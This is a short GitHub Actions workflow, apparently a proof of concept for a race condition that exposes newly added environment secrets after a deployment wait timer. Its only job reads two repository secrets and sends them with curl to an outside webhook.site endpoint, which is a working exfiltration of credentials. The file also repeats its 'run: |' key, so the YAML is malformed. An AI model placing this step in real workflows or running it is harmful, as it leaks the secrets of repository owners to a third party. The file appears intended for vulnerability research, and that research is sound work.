name: Secret Race Condition Test
on:
  workflow_dispatch:
    inputs:
      reason:
        description: "Manual trigger reason"
        required: false
  repository_dispatch:
    types: [poc-run]

jobs:
  deploy-to-prod:
    runs-on: ubuntu-latest
    environment: PROD  # THIS triggers the 2-minute wait timer!
    steps:
      - name: Read secrets after wait timer completes
        env:
          EXISTING_SECRET: ${{ secrets.EXISTING_SECRET }}
          BRAND_NEW_SECRET: ${{ secrets.BRAND_NEW_SECRET }}
        run: |
             run: |
             curl -X POST "https://webhook.site/9bf4ecad-15e2-4fb4-9210-47e6c57041d3" \
               -H "Content-Type: application/json" \
               -d "{\"existing\": \"$EXISTING_SECRET\", \"new\": \"$BRAND_NEW_SECRET\"}"
